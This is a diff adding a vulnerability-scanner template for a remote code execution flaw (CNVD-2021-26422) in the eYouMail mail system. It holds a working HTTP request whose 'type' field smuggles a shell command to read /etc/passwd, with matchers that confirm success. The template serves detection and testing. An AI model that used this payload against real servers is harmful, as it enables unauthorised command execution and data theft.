@@ -1,0 +1,27 @@
+## id: CNVD-2021-26422
+## name: eYouMail - Remote Code Execution
+## author: hack007x
+## severity: critical
+## tags: cnvd2021,cnvd,eyoumail,rce,vuln
+## description: eYouMail is susceptible to a remote code execution vulnerability.
+## cvss-score: 10
+## reference: https://github.com/ltfafei/my_POC/blob/master/CNVD-2021-26422_eYouMail/CNVD-2021-26422_eYouMail_RCE_POC.py
+## reference: https://github.com/EdgeSecurityTeam/Vulnerability/blob/main/%E4%BA%BF%E9%82%AE%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20(CNVD-2021-26422).md
+## verification: true
+
+POST /webadm/?q=moni_detail.do&action=gragh HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: application/x-www-form-urlencoded
+
+type='|cat /etc/passwd||'
+
+#@ condition: and
+#@ matcher: body matches /root:[^:]*:[0-9]+:[0-9]+:/
+#@ matcher: status_code == 200
+
+
+
+
+
+# @VEIL-STAMP: 658df27f51142292d2473ade244ad045e167f517fcd2da170e3d582000fb8ff1
